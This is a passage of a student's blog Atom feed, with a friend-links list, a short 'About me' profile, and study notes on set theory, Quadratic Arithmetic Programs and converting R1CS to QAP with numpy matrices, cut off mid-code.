&lt;p&gt;pankas &lt;a href=&quot;https:&#x2F;&#x2F;pankas.top&#x2F;&quot;&gt;https:&#x2F;&#x2F;pankas.top&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;JBNRZ &lt;a href=&quot;https:&#x2F;&#x2F;jbnrz.com.cn&#x2F;&quot;&gt;https:&#x2F;&#x2F;jbnrz.com.cn&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;humb1e &lt;a href=&quot;https:&#x2F;&#x2F;mmmmchong.github.io&#x2F;&quot;&gt;https:&#x2F;&#x2F;mmmmchong.github.io&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;MiaoTony &lt;a href=&quot;https:&#x2F;&#x2F;miaotony.xyz&#x2F;&quot;&gt;https:&#x2F;&#x2F;miaotony.xyz&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;yolbby &lt;a href=&quot;https:&#x2F;&#x2F;yolbby.github.io&#x2F;&quot;&gt;https:&#x2F;&#x2F;yolbby.github.io&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;L0tus &lt;a href=&quot;https:&#x2F;&#x2F;l0tus.vip&#x2F;&quot;&gt;https:&#x2F;&#x2F;l0tus.vip&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Feifei &lt;a href=&quot;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;biyifei&quot;&gt;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;biyifei&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Ech0 &lt;a href=&quot;https:&#x2F;&#x2F;ech0her.github.io&#x2F;&quot;&gt;https:&#x2F;&#x2F;ech0her.github.io&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Mak4R1 &lt;a href=&quot;https:&#x2F;&#x2F;mak4r1.com&#x2F;&quot;&gt;https:&#x2F;&#x2F;mak4r1.com&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>About me</title>
        <published>2024-03-19T20:16:19+08:00</published>
        <updated>2024-03-19T20:16:19+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/i/profile/"/>
        <id>/blog/i/profile/</id>
        
        <content type="html" xml:base="/blog/i/profile/">&lt;p&gt;I’m Zihao Wang, an undergraduate students of the &lt;a href=&quot;https:&#x2F;&#x2F;en.hdu.edu.cn&quot;&gt;Hangzhou Dianzi University&lt;&#x2F;a&gt;(2022 -). Sometimes playing CTFs with &lt;a href=&quot;https:&#x2F;&#x2F;0rays.club&quot;&gt;0RAYS&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;www.nu1l.com&#x2F;&quot;&gt;Nu1L&lt;&#x2F;a&gt;. And &lt;a href=&quot;&#x2F;blog&#x2F;i&#x2F;sawards&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;’s some selected awards with other teams.&lt;&#x2F;p&gt;
&lt;p&gt;Here I mainly record some notes related to blockchain security and cryptography. Maybe I will write some personal thoughts in the future.🤔&lt;&#x2F;p&gt;
&lt;p&gt;Due to some minor psychological challenges, I tend to be timid, introverted, and struggle with verbal expression. However, growing up in a loving Christian family has provided me with a nurturing environment. Please forgive me if my words unintentionally come across as hurtful; I rarely harbor any ill intentions towards others.🤗&lt;&#x2F;p&gt;
&lt;p&gt;If you want to contact me or point out my mistakes, welcome to contact me using the Gmail address or telegram link on the homepage.😺&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Set Theory</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-1/"/>
        <id>/blog/zknote/post-1/</id>
        
        <content type="html" xml:base="/blog/zknote/post-1/">&lt;h3 id=&quot;set&quot;&gt;Set&lt;&#x2F;h3&gt;
&lt;p&gt;Cartesian product: a set such that every element from one set is one part of an ordered pair with an element from another set&lt;&#x2F;p&gt;
&lt;p&gt;function is a subset of the cartesian product&lt;&#x2F;p&gt;
&lt;p&gt;reversed subset: superset&lt;&#x2F;p&gt;
&lt;p&gt;A subset need not be strictly smaller than the set it is a part of&lt;&#x2F;p&gt;
&lt;p&gt;Cardinality means the count of elements in a finite set&lt;&#x2F;p&gt;
&lt;p&gt;union: 并集&lt;&#x2F;p&gt;
&lt;p&gt;intersection: 交集&lt;&#x2F;p&gt;
&lt;h3 id=&quot;mapping-fuction&quot;&gt;mapping&#x2F;fuction&lt;&#x2F;h3&gt;
&lt;p&gt;mapping between sets comes about by taking a subset of their cartesian product&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Axiom_of_choice&quot;&gt;axiom of choice&lt;&#x2F;a&gt;: The cartesian product of a collection of non-empty sets is non-empty.&lt;&#x2F;p&gt;
&lt;p&gt;The floor function simply removes the decimal portion of a number.&lt;&#x2F;p&gt;
&lt;p&gt;When defining a function with a cartesian product, the same domain element cannot map to two different co-domain elements.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;injective-surjective-and-bijective-functions&quot;&gt;Injective, Surjective, and Bijective functions&lt;&#x2F;h3&gt;
&lt;p&gt;An injective function means the elements in the codomain have &lt;em&gt;at most&lt;&#x2F;em&gt; one preimage. If one of the elements does not have a preimage, that is okay, but if more than one element in the domain maps to the same element, it is not injective. We can also say that if an output element has a preimage, then it is unique.&lt;&#x2F;p&gt;
&lt;p&gt;A surjective function means the elements in the codomain has &lt;em&gt;at least&lt;&#x2F;em&gt; one preimage. If an element in the codomain does not have a preimage, the function is not surjective.&lt;&#x2F;p&gt;
&lt;p&gt;A function is bijective if and only if it is injective and surjective.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;properties-of-binary-operators-over-sets&quot;&gt;Properties of binary operators over sets&lt;&#x2F;h3&gt;
&lt;p&gt;Magma: A magma is a set with a closed binary operator.&lt;&#x2F;p&gt;
&lt;p&gt;Semigroup: A semigroup is a magma where the binary operator must be associative.&lt;&#x2F;p&gt;
&lt;p&gt;Monoid: A monoid is a semigroup with an identity element. (An identity element means you do a binary operator with the identity element and another element a, you get a. In the example of addition 8 + 0 = 8, where 0 is the identity element)&lt;&#x2F;p&gt;
&lt;p&gt;Group: A group is a monoid where each element has an inverse.Or to be explicit, it is a set with three properties&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;a closed and associative binary operator (a semigroup)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;an identity element (a monoid)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;every element has an inverse. That is, there exists an inverse element of the set such that the binary operator of an element and its inverse produces the identity element.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Abelian Group: an abelian group, also called a commutative group, is a group in which the result of applying the group operation to two group elements does not depend on the order in which they are written. That is, the group operation is commutative. With addition as an operation, the integers and the real numbers form abelian groups, and the concept of an abelian group may be viewed as a generalization of these examples.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Quadratic Arithmetic Programs</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-10/"/>
        <id>/blog/zknote/post-10/</id>
        
        <content type="html" xml:base="/blog/zknote/post-10/">&lt;h3 id=&quot;quadratic-arithmetic-programs&quot;&gt;Quadratic Arithmetic Programs&lt;&#x2F;h3&gt;
&lt;p&gt;A Quadratic Arithmetic Program (QAP) is a system of equations where the coefficients are monovariate polynomials and a valid solution results in a single polynomial equality. They are quadratic because they have exactly one polynomial multiplication.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;homomorphic-between-vector-and-lagrange-polynomial&quot;&gt;homomorphic between vector and lagrange polynomial&lt;&#x2F;h3&gt;
&lt;p&gt;binary operator equivalence between vectors and interpolating polynomials, including adding and &lt;code&gt;Hadamard product&lt;&#x2F;code&gt; between two vector and multiply a vector with a scalar.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;schwartz-zippel-lemma&quot;&gt;Schwartz-Zippel Lemma&lt;&#x2F;h3&gt;
&lt;p&gt;The Schwartz-Zippel Lemma states that if two polynomials are randomly evaluated at the same x value, and their y value is the same, then one can be nearly certain that they are the same polynomial.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;convert-matrix-computing-in-r1cs-to-polynomial-computing&quot;&gt;Convert matrix computing in R1CS to polynomial computing&lt;&#x2F;h3&gt;
&lt;p&gt;Original R1CS:
$$
\left(U · a\right)(V · a) = W · a
$$
For each colomns in $U\ V\ W\ $and$\ a$ matrix perform Lagrangian interpolation transformation we could get
$$
\sum_{i=0}^{m}a_iu_i\sum_{i=0}^{m}a_iv_i = \sum_{i=0}^{m}a_iw_i
$$
In this formula, $a_i$ and $u_i$ take out the column numbered i as a vector, and $m$ is the columns count of $U\ V\ W\ a$.&lt;&#x2F;p&gt;
&lt;p&gt;Then according to the lemma mentioned above, polynomial comparison can be performed by setting the parameters of the polynomial.
$$
\sum_{i=0}^{m}a_iu_i\left(x\right)\sum_{i=0}^{m}a_iv_i\left(x\right) = \sum_{i=0}^{m}a_iw_i\left(x\right)
$$&lt;&#x2F;p&gt;
&lt;h3 id=&quot;the-above-qap-is-imbalanced&quot;&gt;the above QAP is imbalanced&lt;&#x2F;h3&gt;
&lt;p&gt;xxxxxxxxxx assert term_1 * term_2 == term_3 + h * t, “division has a remainder“python&lt;&#x2F;p&gt;
&lt;p&gt;If we add a zero vector, we aren’t changing the equality, but if the zero vector is transformed to a polynomial degree four (which interpolates y = 0 at x = {1, 2, 3, 4}), then we can have the right-hand side be a degree four polynomial, and the left-hand-side have a degree four polynomial, making it possible for them to be equal everywhere.&lt;&#x2F;p&gt;
&lt;p&gt;now we let the zero vector to be &lt;code&gt;t(x) · h(x)&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;get-t-x-and-h-x&quot;&gt;get t(x) and h(x)&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;t(x)&lt;&#x2F;code&gt; could easily get by lagrange interpolation &lt;code&gt;[0, 0, 0 ...]&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;It should be obvious that although t(x) represents the zero vector (it has roots at x = 1,2,3…), it won’t necessarily balance the equation $(U·a)(V·a) = (W·a) + t(x)$. We need to multiply it by yet another polynomial that interpolates zero and balances out the equation.&lt;&#x2F;p&gt;
&lt;p&gt;When two non-zero polynomials are multiplied, the roots of the product is the union of the roots of the individual polynomials.&lt;&#x2F;p&gt;
&lt;p&gt;Therefore, we can multiply t(x) by anything except zero, and it will still correspond to a zero vector in vector land.
$$
(U·a)(V·a) - (W·a) = 0\
(U·a)(V·a) - (W·a) = h(x)t(x)\
\frac{(U·a)(V·a) - (W·a)}{t(x)} = h(x)
$$
then we could write the final calculation to be
$$
\sum_{i=0}^{m}a_iu_i\left(x\right)\sum_{i=0}^{m}a_iv_i\left(x\right) = \sum_{i=0}^{m}a_iw_i\left(x\right)+h\left(x\right)t\left(x\right)
$$&lt;&#x2F;p&gt;
&lt;h3 id=&quot;encrypted-polynomial-evaluation&quot;&gt;encrypted polynomial evaluation&lt;&#x2F;h3&gt;
&lt;p&gt;Neither the prover nor the verifier should know the random point the polynomials are being evaluated at, otherwise the prover can cheat.&lt;&#x2F;p&gt;
&lt;p&gt;So the trusted setup computes
$$
[xG], [x^2G], [x^3G]\ …
$$
And the prover computes the polynomials (U·a), (V·a), (W·a), and h(x) by multiplying those elliptic curve points with their polynomial coefficients.&lt;&#x2F;p&gt;
&lt;p&gt;The prover just need to check &lt;code&gt;pairing([A], [B]) = [C&#x27;] + [HT]&lt;&#x2F;code&gt; where A, B, C’ are respectively the calculated elliptic curve points.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>R1CS to QAP in Python</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-11/"/>
        <id>/blog/zknote/post-11/</id>
        
        <content type="html" xml:base="/blog/zknote/post-11/">&lt;h3 id=&quot;r1cs-to-qap-in-python&quot;&gt;R1CS to QAP in Python&lt;&#x2F;h3&gt;
&lt;p&gt;For constraint&lt;&#x2F;p&gt;
&lt;p&gt;$$
out = x⁴ - 5y²x² \
=&amp;gt; \space\begin{equation}&lt;br &#x2F;&gt;
\left{
\begin{array}{&lt;strong&gt;lr&lt;&#x2F;strong&gt;}
v_1 = x&lt;em&gt;x \
v_2 = v_1&lt;&#x2F;em&gt;v_1 \
v_3 = -5y * y \
-v_2 + out = v_3 * v_1
\end{array}
\right.
\end{equation}
$$&lt;&#x2F;p&gt;
&lt;p&gt;we have new matrices are&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;L &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;array&lt;&#x2F;span&gt;&lt;span&gt;([
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;74&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;R &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;array&lt;&#x2F;span&gt;&lt;span&gt;([
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;O &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;array&lt;&#x2F;span&gt;&lt;span&gt;([
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span 